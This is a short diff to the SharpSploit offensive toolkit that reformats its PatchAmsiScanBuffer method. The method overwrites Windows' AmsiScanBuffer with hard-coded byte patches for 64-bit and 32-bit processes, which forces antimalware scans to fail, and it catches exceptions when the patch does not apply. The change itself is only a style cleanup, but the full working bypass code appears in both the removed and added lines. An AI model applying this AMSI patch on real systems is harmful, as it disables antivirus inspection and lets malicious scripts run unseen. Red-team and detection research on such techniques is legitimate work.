@@ -26,8 +26,14 @@ namespace SharpSploit.Evasion
         public static bool PatchAmsiScanBuffer()
         {
             byte[] patch;
-
-            if (Utilities.is64Bit) { patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; } else { patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }; }
+            if (Utilities.Is64Bit)
+            {
+                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            }
+            else
+            {
+                patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+            }
 
             try
             {
@@ -44,7 +50,6 @@ namespace SharpSploit.Evasion
             catch (Exception e)
             {
                 Console.Error.WriteLine("Exception: " + e.Message);
-
                 return false;
             }
         }
